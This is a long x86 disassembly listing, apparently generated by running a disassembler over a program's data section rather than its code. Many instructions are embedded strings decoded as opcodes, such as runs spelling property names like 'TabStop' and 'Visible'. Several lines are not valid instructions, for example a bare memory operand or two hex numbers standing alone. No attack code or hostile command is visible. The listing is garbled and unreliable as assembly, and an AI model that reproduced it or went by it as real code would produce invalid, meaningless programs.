add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
dec eax
add eax 0x52100044
popad
insb
or esp [ ebp + 0x63 ]
push ebp
jo r-xdata
or esp [ ebp + 0x63 ]
dec esp
outsd
ja r-xdata
jb r-xdata
jb r-xdata
arpl [ gs : esi + 0x6f ] cx
dec esp
jb r-xdata
je r-xdata
andps xmm1 [ gs : edi + 0x77 ]
insb
jae r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
je r-xdata
push esp
push edi
insd
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
inc esp
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
inc ecx
add al dh
xchg edi eax
add [ edi + edi - 0x33ffbf ] al
jb r-xdata
aas
inc ecx
add ah cl
inc [ ebx ]
xchg esp eax
rol [ ebx ] cl
in al dx
push es
jb r-xdata
mov eax eax
jo r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
je r-xdata
push 0x6e490774
outsb
jb r-xdata
andps xmm1 [ edi + 0x77 ]
outsb
je r-xdata
jb r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax + 0x492cff00 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
outsd
jb r-xdata
je r-xdata
outsd
insd
inc ebp
imul esi [ fs : eax + esi * 2 + 0xa ] 0xa1a00043
inc ebx
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
popad
jae r-xdata
xchg esp eax
inc ecx
add al cl
xor al 0x40
add [ eax + 0x48 ] al
inc ebx
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
pushfd
or eax [ ebx ]
inc ebx
add [ eax + 0x7c004143 ] bl
dec edx
inc ebx
jb r-xdata
add [ edi + eax * 2 ] ah
inc ecx
add ah al
dec ecx
inc ebx
add al ah
dec ecx
inc ebx
add [ edi + eax * 2 + 0x4c200041 ] al
inc ecx
add [ eax + 0x4a ] bl
inc ebx
add [ ebp + ecx * 2 + 0x4e440041 ] bh
inc ecx
add [ ebx + ecx * 2 + 0x4f8c0043 ] cl
inc ecx
add [ eax - 0x43ffbebe ] bl
inc edx
inc ecx
add al ah
inc edx
inc ecx
add ah dl
dec edx
inc ebx
add [ ebx + ecx * 2 + 0x43 ] al
add [ esi + eax * 2 ] bh
inc ecx
add [ eax ] dh
inc edi
inc ecx
add [ ebx + ecx * 2 + 0x43 ] ah
add [ eax ] bh
dec ecx
inc ecx
add [ edx + ecx * 2 ] cl
inc ecx
add [ edx + ebp + 0x40 ] dh
add [ eax + 0x4a ] al
inc ecx
add [ eax + 0x4a ] dh
inc ecx
add ah al
dec edx
inc ecx
add [ eax + 0x4b ] dh
inc ecx
add [ eax ] cl
dec ebp
inc ecx
add [ eax + 0x4d ] ah
inc ecx
add ah dh
dec ebp
inc ecx
add [ esi ] dl
push esp
inc ebx
jne r-xdata
inc eax
ja r-xdata
[ ecx + ecx * 2 ]
or eax [ ebx ]
or [ esi ] cl
push esp
inc esp
jb r-xdata
add [ esi ] eax
dec ecx
outsb
je r-xdata
inc esp
add [ eax ] bh
sbb al [ eax + eax - 0x7c ]
inc ebx
add [ ebx + edx * 8 + 0x6ec0043 ] dl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
je r-xdata
mov al [ 0x3c0043a1 ]
adc [ eax ] al
cmp al 0x10
je r-xdata
pop edi
inc eax
add [ ebx + 0x430c54c0 ] cl
ja r-xdata
add [ eax ] ah
xor al [ eax ]
push 0x68004142
inc eax
inc ecx
add [ eax - 0x67ffbebc ] ah
inc ebx
inc ecx
add [ edx + ecx * 2 + 0x43 ] bh
jb r-xdata
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add [ eax + 0x40 ] dh
inc ebx
add [ ecx * 2 + 0x52400044 ] ah
inc esp
add [ ecx + edx * 2 - 0x2df7ffbc ] cl
inc ebx
add [ eax - 0x3fffbbb9 ] ah
inc edi
inc esp
add al bl
inc esp
inc esp
add [ eax - 0x2f ] dl
inc ebx
add [ ecx + edx * 8 + 0x43 ] dl
add [ ecx + eax + 0x1c80044 ] bl
inc esp
add [ eax ] bh
inc ecx
inc ebx
add ah cl
rol [ ebx ] cl
and dh bl
inc ebx
add [ eax - 0x53ffbc23 ] bl
loopne r-xdata
insb
jae r-xdata
inc ebx
add al dh
0x34c00041 0x40
inc esp
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add al al
xor al 0x40
inc ebx
add [ eax + eax ] dl
add [ eax ] al
dec esp
sbb [ ecx ] eax
mov ah 0x34
inc eax
jb r-xdata
je r-xdata
add ah al
xor al 0x40
add [ eax ] al
add [ ecx + ebx + 0x41 ] cl
add [ esp + esi + 0x34c00040 ] dh
inc eax
jb r-xdata
je r-xdata
shl [ eax + 0xa ] 0x43
inc esp
add [ edi + eax * 2 ] cl
inc esp
add ah bl
and al 0x44
add [ eax ] al
pop ecx
inc esp
add [ eax + 0x78004443 ] cl
inc esi
inc esp
add [ eax + 0x5a ] dh
inc ebx
add al dh
dec esi
inc ebx
add [ edi + ecx * 2 ] bl
inc ebx
add [ edx + ebx * 2 + 0x4e140043 ] al
inc ebx
add [ ecx + ebx * 2 + 0x59b80043 ] ch
inc ebx
add [ edx + ebx * 2 + 0x43 ] al
add al ah
xchg esi eax
inc esp
add [ esi + ecx * 2 + 0x43 ] ah
add ah cl
pop eax
inc ebx
add [ ecx + edx * 2 + 0x2a740043 ] dl
inc eax
add [ edx + ebp + 0x40 ] dh
add [ eax + 0x7400434f ] bl
sub al [ eax ]
jl r-xdata
add [ eax - 0x21 ] bl
inc ebx
add [ eax + 0x54 ] dh
inc ebx
add [ edx + eax + 0x44 ] cl
add [ eax * 2 + 0x45e80044 ] ch
inc esp
add ah ah
inc eax
inc esp
add ah cl
inc ebp
inc esp
add [ edi + eax + 0x44 ] ah
add al bh
or eax 0x1b980044
inc esp
add [ ebp + edx + 0x18800044 ] al
inc esp
add [ eax + ebx * 2 + 0x1c300043 ] dl
inc esp
add [ esp + ebx ] dh
inc esp
add [ eax + 0x4e ] al
inc ebx
add [ edx + ebx + 0x470c0044 ] dl
add [ eax ] al
add [ eax ] al
and [ edi ] cl
inc ebx
add [ eax + 0xf ] dh
inc ebx
add [ edx + eax ] ah
add al dl
stosb [ edi ]
je r-xdata
inc eax
add [ ebx + 0x430cf8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx + 0x43 ] dl
add [ eax ] al
add [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
add [ eax + 0x3c0043a1 ] ah
adc [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xd ] bh
dec ecx
je r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
insd
inc ebp
jbe r-xdata
jae r-xdata
inc ebx
add [ eax + 0xd004359 ] cl
add [ ecx ] al
add [ eax + esi * 4 ] al
adc [ eax + 0x2bbd11 ] dh
sub al 0x0
sub eax 0xb3008700
push [ edx - 0x4f004e01 ]
push [ ebp + 0x434fa8ff ]
add [ eax ] cl
push eax
inc ebx
add [ eax + edx * 2 ] bl
inc ebx
add [ eax - 0x33ffbcab ] al
dec edi
inc ebx
add ah dl
dec edi
inc ebx
add ah bl
dec edi
inc ebx
add ah ah
dec edi
inc ebx
add ah ch
push esi
inc ebx
add [ eax + 0x58 ] ch
inc ebx
add ah cl
push edi
inc ebx
add [ eax + 0x58 ] cl
inc ebx
add [ eax + ebx * 2 ] dl
inc ebx
add [ esp + edx * 2 ] cl
inc ebx
jne r-xdata
xor al 0x40
add [ eax + 0x22 ] dh
inc esp
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
mov eax 0x1000434d
imul ebp [ esi + 0x67 ] 0xd949073
inc ebx
add [ edi ] al
push ss
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
jae r-xdata
dec ebp
popad
outsb
je r-xdata
jae r-xdata
outsd
dec esp
imul esi [ ebx + 0x74 ] 0x4f736310
je r-xdata
push edx
inc esp
add [ eax ] bh
sbb al [ eax + eax - 0x7c ]
aas
dec ebp
inc ebx
add [ eax ] dl
je r-xdata
add [ eax ] al
js r-xdata
outsb
je r-xdata
add al 0x8
pop es
inc ebx
outsd
outsb
je r-xdata
and [ edx ] dh
inc eax
add [ eax + 0x5b ] ah
ja r-xdata
adc [ ebx + 0x73 ] ah
dec edi
adc esp [ ebx + 0x73 ]
je r-xdata
jb r-xdata
ja r-xdata
insd
inc ebx
outsd
insd
bound ebp [ edi - 0x73 ]
inc eax
add [ edi + ecx + 0xc070043 ] al
push esp
inc ebx
jne r-xdata
add [ eax + 0x1000434d ] bh
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
aas
inc ecx
add ah ch
push edi
jb r-xdata
dec edi
ja r-xdata
adc esp [ fs : ebx + 0x73 ]
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x10 ]
push cs
inc ebx
add [ eax ] ah
lodsb [ esi ]
inc ebx
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
inc ebx
add [ eax ] dl
adc [ ebx ] eax
enter 0x4311 0x0
jb r-xdata
add [ eax + 0x22 ] dh
inc eax
xchg esp eax
inc ecx
add al cl
je r-xdata
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
outsd
les esi [ eax + eax * 2 ]
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
inc ecx
add al al
xor al 0x40
add [ esp + edx * 4 + 0x41 ] al
jb r-xdata
jb r-xdata
inc ebx
je r-xdata
jo r-xdata
ja r-xdata
inc ecx
add ah ch
push edi
imul ebp [ esi + 0x67 ] 0x430cf873
add [ edx + ebx ] dh
inc ecx
add [ eax ] al
add [ eax ] cl
push ebx
je r-xdata
add al 0x32
insb
add [ 0x65646e49 ] al
js r-xdata
push edx
inc esp
add [ eax ] bh
sbb al [ eax + eax - 0x7c ]
ja r-xdata
inc ebx
je r-xdata
insb
jae r-xdata
inc esp
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
inc ecx
add al dh
xchg edi eax
in al dx
push es
inc esp
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
pushad
pop ebx
add al cl
xor al 0x40
add [ edx + eax + 0xdc40000 ] dl
inc ebx
add al dh
0x34c00041 0x40
inc esp
xchg esp eax
imul edi [ eax + 0x65 ] 0x73631364
inc ebx
add [ ebx + edx * 8 + 0x6ec0043 ] dl
inc esp
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
inc ecx
inc ebx
je r-xdata
popad
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
insb
jae r-xdata
add [ eax + r-xdata ] dl
add ecx [ esi ]
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add ah al
dec esp
inc ebx
add [ ecx * 2 + 0x52400044 ] ah
inc esp
add [ ecx + edx * 2 - 0x2df7ffbc ] cl
inc ebx
add [ eax - 0x3fffbbb9 ] ah
inc edi
inc esp
add al bl
inc esp
inc esp
add [ eax - 0x2f ] dl
inc ebx
add [ ecx + edx * 8 + 0x43 ] dl
add [ ecx + eax + 0x1c80044 ] bl
inc esp
add [ esp + ebx * 8 - 0x2d33ffbd ] dl
inc ebx
add [ eax ] ah
fiadd [ ebx ]
cwde
fld [ ebx ]
lodsb [ esi ]
loopne r-xdata
insb
jae r-xdata
inc ebx
add [ ebx + edx * 8 + 0x6ec0043 ] dl
popad
bound ebp [ ebp + 0x8 ]
push ebx
je r-xdata
xchg esp eax
add al [ eax ]
add ah al
or eax 0x9af00043
shr [ eax + 0x10 ] 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
je r-xdata
add [ ebp + 0xe100040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx + 0x43 ] al
add [ eax ] al
rol [ ebx ] cl
add [ eax ] al
add [ eax ] al
add [ esi - 0x37ffbcef ] dl
adc [ ebx ] eax
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
test al 0xf
inc ebx
add [ edx ] cl
arpl [ ebx + 0x44 ] si
jb r-xdata
inc ebx
jo r-xdata
outsd
ja r-xdata
add [ eax ] al
les ecx [ 0xffffffff9af00043 ]
or [ ebx + 0x73 ] ah
push ebx
imul ebp [ ebp + 0x70 ] 0x630e656c
jae r-xdata
add [ eax ] al
add [ ecx + edx + 0x11dc0043 ] al
jb r-xdata
inc ecx
jo r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
adc [ ebx ] eax
fcom [ ecx ]
outsd
sub_431092
inc ecx
add ah bl
pop edx
inc ebx
add [ ecx * 2 + 0x52400044 ] ah
inc esp
add [ ecx + edx * 2 - 0x2df7ffbc ] cl
inc ebx
add [ eax - 0x3fffbbb9 ] ah
inc edi
inc esp
add al bl
inc esp
inc esp
add [ eax - 0x2f ] dl
inc ebx
add [ ecx + edx * 8 + 0x43 ] dl
add [ ecx + eax + 0x1c80044 ] bl
inc esp
add [ esp + ebx * 8 - 0x2d33ffbd ] dl
inc ebx
add [ eax ] ah
fiadd [ ebx ]
cwde
fld [ ebx ]
lodsb [ esi ]
loopne r-xdata
inc ebx
add [ edi + eax * 2 ] cl
inc esp
add ah bl
and al 0x44
add [ eax ] al
pop ecx
inc esp
add [ eax + 0x78004443 ] cl
inc esi
inc esp
add [ eax + 0x5a ] dh
inc ebx
add al dh
dec esi
inc ebx
add [ edi + ecx * 2 ] bl
inc ebx
add [ edx + ebx * 2 + 0x4e140043 ] al
inc ebx
add [ ecx + ebx * 2 + 0x59b80043 ] ch
inc ebx
add [ edx + ebx * 2 + 0x43 ] al
add al ah
xchg esi eax
inc esp
add [ esi + ecx * 2 + 0x43 ] ah
add ah cl
pop eax
inc ebx
add [ ecx + edx * 2 + 0x66d00043 ] dl
inc ebx
add al dh
pop ebx
inc ebx
add [ eax - 0x3bffbcb1 ] bl
inc bx
add [ edx + ebx * 2 + 0x43 ] bh
add [ eax + 0x10004359 ] cl
push edi
inc ebx
add al ah
inc ebx
add [ eax + 0xe00435b ] dh
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2700040 ] dl
add [ eax ] al
or [ eax ] al
adc al 0x0
or [ eax - 0x43d343d5 ] esi
add [ edx ] eax
sldt [ ebx + 0x8ffba00 ]
pop esi
inc ebx
add [ eax + 0x50 ] al
inc ebx
add [ eax ] al
inc ebx
add al bl
add [ eax - 0x21 ] bl
inc ebx
add [ esi + 0x43 ] bh
add [ edx + eax + 0x44 ] cl
add [ eax * 2 + 0x45e80044 ] ch
inc esp
add ah ah
inc eax
inc esp
add ah cl
inc ebp
inc esp
add [ edi + eax + 0x44 ] ah
add al bh
or eax 0x1b980044
inc esp
add [ esp + ebx * 2 ] dl
inc ebx
add [ eax + 0x78004418 ] al
pop esp
inc ebx
add [ eax ] dh
sbb al 0x44
add [ esp + ebx ] dh
inc esp
add [ eax + 0x4e ] al
inc ebx
add [ eax + 0xc00435d ] bh
inc edi
inc esp
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
pushad
pop ebx
inc ebx
add [ eax ] dl
push edx
inc esp
add [ eax ] bh
sbb al [ eax + eax - 0x7c ]
aas
inc ecx
add ah ch
push edi
outsd
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc ebx
add [ edi + eax * 2 ] cl
inc esp
add ah bl
and al 0x44
add [ eax ] al
pop ecx
inc esp
add [ eax + 0x78004443 ] cl
inc esi
inc esp
add [ eax + 0x5a ] dh
inc ebx
add al dh
dec esi
inc ebx
add [ edi + ecx * 2 ] bl
inc ebx
add [ edx + ebx * 2 + 0x4e140043 ] al
inc ebx
add [ ecx + ebx * 2 + 0x59b80043 ] ch
inc ebx
add [ edx + ebx * 2 + 0x43 ] al
add al ah
xchg esi eax
inc esp
add [ esi + ecx * 2 + 0x43 ] ah
add ah cl
pop eax
inc ebx
add [ ecx + edx * 2 + 0x66d00043 ] dl
inc ebx
add al dh
pop ebx
inc ebx
add [ eax - 0x3bffbcb1 ] bl
inc bx
add [ edx + ebx * 2 + 0x43 ] bh
add [ eax + 0x10004359 ] cl
push edi
inc ebx
add al ah
inc ebx
add [ eax + 0x900435b ] dh
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax - 0x21 ] bl
inc ebx
add [ esi + 0x43 ] bh
add [ edx + eax + 0x44 ] cl
add [ eax * 2 + 0x45e80044 ] ch
inc esp
add ah ah
inc eax
inc esp
add ah cl
inc ebp
inc esp
add [ edi + eax + 0x44 ] ah
add al bh
or eax 0x1b980044
inc esp
add [ esp + ebx * 2 ] dl
inc ebx
add [ eax + 0x78004418 ] al
pop esp
inc ebx
add [ eax ] dh
sbb al 0x44
add [ esp + ebx ] dh
inc esp
add [ eax + 0x4e ] al
inc ebx
add [ eax + 0xc00435d ] bh
inc edi
inc ebx
add [ esi ] al
inc ebx
add al bl
inc bx
add [ eax ] dl
imul eax [ ebx ] sub_435f50
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
adc [ ebx ] eax
pop es
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
sar [ ebx + edx + 0x43 ] 0x0
pop es
or [ ebx + eax * 2 + 0x6f ] edx
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc ebx
add [ edi + edi + 0x57ec0041 ] al
outsd
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax ] al
add [ eax + eax ] cl
adc al [ ebx ]
fcom [ ecx ]
inc ebx
add [ ebp ] al
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc esp
adc [ ebx ] al
or [ edi ] 0x43
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
dec ecx
outsb
outsb
outsd
inc esp
jb r-xdata
insb
outsd
jae r-xdata
insb
jae r-xdata
add [ ebx + edx * 8 + 0x6ec0043 ] dl
inc esp
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add ah bl
pop edx
inc ebx
add [ ecx * 2 + 0x52400044 ] ah
inc esp
add [ ecx + edx * 2 - 0x2df7ffbc ] cl
inc ebx
add [ eax - 0x3fffbbb9 ] ah
inc edi
inc esp
add al bl
inc esp
inc esp
add [ eax - 0x2f ] dl
inc ebx
add [ ecx + edx * 8 + 0x43 ] dl
add [ ecx + eax + 0x1c80044 ] bl
inc esp
add [ esp + ebx * 8 - 0x2d33ffbd ] dl
inc ebx
add [ eax ] ah
fiadd [ ebx ]
cwde
fld [ ebx ]
lodsb [ esi ]
loopne r-xdata
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
popfd
inc ebx
add [ ebp + 0x1 ] ah
add bh bh
adc [ esp + eax * 2 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + 0x65 ] eax
jbe r-xdata
insb
jo r-xdata
add [ ecx ] cl
inc edx
jbe r-xdata
push ebp
jo r-xdata
or al 0x41
jne r-xdata
add [ eax ] al
or al 0x0
add [ eax ] al
adc [ eax ] al
push 0x68ff0002
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
or al 0x41
jne r-xdata
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
outsd
outsb
jae r-xdata
xchg esp eax
cmovno eax [ eax ]
pop edi
add [ eax ] al
push [ eax ]
add dh bh
call sub_4358d5
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080014 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xd865646f
or [ ebx ] eax
je r-xdata
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
insb
inc edx
outsd
ja r-xdata
jbe r-xdata
popfd
inc ebx
add [ edx + 0x1 ] ah
add bh bh
push eax
push esp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
insb
outsd
inc ebx
outsd
insd
jo r-xdata
add [ ebx + 0x431250c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx + 0x43 ] ch
add [ eax + 0x1c000002 ] bl
adc [ ebx ] al
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
cmp al 0x10
jb r-xdata
adc [ ecx + 0x43 ] 0x0
add bh bh
adc eax 0x68430800
popad
jb r-xdata
inc esp
imul ecx [ ebp + 0x6f ] 0x9d86564
inc ebx
add [ edx + eax ] dh
inc [ eax + 0x1004351 ]
insb
dec edi
jne r-xdata
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
inc ebp
jae r-xdata
insb
jb r-xdata
add [ eax ] dl
inc eax
add [ eax - 0x6f00fffe ] dl
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x75410b00
je r-xdata
adc al [ eax ]
add eax 0x6c797453
and [ gs : esi + 0x610043 ] cl
add bh bh
sbb dl dl
inc ebx
add [ edx + edx * 8 + 0x43 ] dh
add [ eax + 0x3 ] al
adc eax [ eax ]
pop es
add [ eax ] al
pushfd
inc ebx
add [ ebx + 0x1 ] ah
add bh bh
or al 0x54
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
jbe r-xdata
je r-xdata
add bh bh
mov [ ecx ] al
inc ebx
outsd
jne r-xdata
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x38ff0001 ] ah
dec eax
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
dec [ esp + edx * 2 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
insb
inc ebx
push cs
add [ edx ] cl
add [ eax ] dl
inc eax
add [ ecx + 0x2 ] ch
add bh bh
imul eax [ edx ] 0x1ff00
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x0
push cs
push eax
popad
jb r-xdata
insd
dec eax
imul esp [ gs : edi + 0x68 ] 0x40103c74
add ah cl
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
pop es
dec ecx
je r-xdata
inc eax
add [ eax ] dl
add al [ eax ]
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
sbb al 0x0
or eax 0x706f7244
inc esp
outsd
ja r-xdata
cmp al 0x10
xor eax [ eax - 0x7a ]
inc esp
loopne r-xdata
cld
test eax 0x700041
add bh bh
loopne r-xdata
add [ edi ] cl
add [ edx ] cl
inc edx
cmovae eax [ eax ]
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
outsb
je r-xdata
adc [ eax ] al
push eax
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax + ecx * 2 + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
cmp [ eax + 0x44 ] cl
add [ eax + 0x43e0 ] al
add [ eax ] al
add [ 0x16ff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
sbb [ ecx ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add bh bh
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
add [ eax ] al
add [ esi ] ah
add [ ebx ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
dec [ eax + 0x10043e0 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x61500b00
jb r-xdata
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov es [ ebx ]
je r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
[ ecx + ecx * 2 ]
imul ebp [ esi + 0x74 ] r-xdata
jne r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
sub [ eax ] al
outsb
je r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
add bh bh
in al 0x3
inc esp
add [ ecx ] al
pushfd
pop ebx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
dec ecx
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax 0x61540700
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
jo r-xdata
adc [ eax ] al
0x38ff0000 0x43e0
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push cs
push eax
popad
jb r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ edx ] cl
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
pushfd
scasb [ edi ]
inc ecx
add [ eax ] ch
add bh bh
mov eax 0xc80043df
fild [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
lea eax [ ebx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
das
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xdc656c62
adc [ ecx ] al
sbb [ edx ] al
add bh bh
sbb [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or [ edi + 0x6e ] cl
mov al 0x8d
inc ebx
add [ eax + ecx * 2 + 0x49140044 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sub al 0x0
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
lea eax [ ebx ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc esp
add [ ecx + ecx * 2 ] dl
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
sub eax [ eax ]
push es
push ebx
outsd
jb r-xdata
add al [ eax ]
[ ebx + ebx * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
push eax
popad
jb r-xdata
adc [ eax ] al
